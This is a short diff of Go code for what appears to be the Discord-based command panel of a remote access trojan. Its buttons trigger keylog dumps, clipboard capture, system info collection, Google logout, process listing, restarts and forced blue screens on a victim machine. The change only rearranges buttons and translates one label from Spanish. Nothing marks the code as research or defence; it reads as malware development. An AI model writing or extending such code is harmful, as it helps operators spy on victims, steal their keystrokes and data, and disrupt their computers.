@@ -79,10 +79,10 @@ func ControlPanel() []discordgo.MessageComponent {
 			Button("💻 SysInfo", discordgo.PrimaryButton, "btn_sysinfo"),
 			Button("📋 Clipboard", discordgo.PrimaryButton, "btn_clipboard"),
 			Button("🔑 Keylog Dump", discordgo.PrimaryButton, "btn_keylog_dump"),
-			Button("🚪 Cerrar Google", discordgo.DangerButton, "btn_google_close"),
+			Button("⏻ Kill Agent", discordgo.DangerButton, "btn_kill"),
 		}},
 		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
-			Button("⏻ Kill Agent", discordgo.DangerButton, "btn_kill"),
+			Button("🚪 Logout Google", discordgo.DangerButton, "btn_google_close"),
 			Button("🔄 Restart", discordgo.DangerButton, "btn_restart"),
 			Button("📂 Processes", discordgo.DangerButton, "btn_ps"),
 			Button("💀 BSOD", discordgo.DangerButton, "btn_bsod"),
